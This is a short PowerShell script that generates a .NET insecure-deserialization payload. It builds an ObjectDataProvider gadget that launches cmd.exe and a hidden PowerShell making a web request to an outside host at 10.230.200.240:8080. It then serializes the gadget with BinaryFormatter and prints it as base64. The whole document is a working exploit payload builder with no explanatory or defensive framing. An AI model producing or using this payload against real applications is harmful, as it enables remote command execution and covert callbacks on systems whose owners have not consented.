$odp = New-Object System.Windows.Data.ObjectDataProvider
$odp.MethodName = "Start"
$odp.MethodParameters = New-Object System.Collections.ArrayList
$odp.MethodParameters.Add("cmd.exe")
$odp.MethodParameters.Add("/c powershell.exe -NoP -NonI -W Hidden -C ""Invoke-WebRequest -Uri 'http://10.230.200.240:8080/' -UseBasicParsing""")
$odp.ObjectInstance = $null

$formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
$ms = New-Object System.IO.MemoryStream
$formatter.Serialize($ms, $odp)
$base64Payload = [Convert]::ToBase64String($ms.ToArray())
Write-Host "Base64 Payload: $base64Payload"
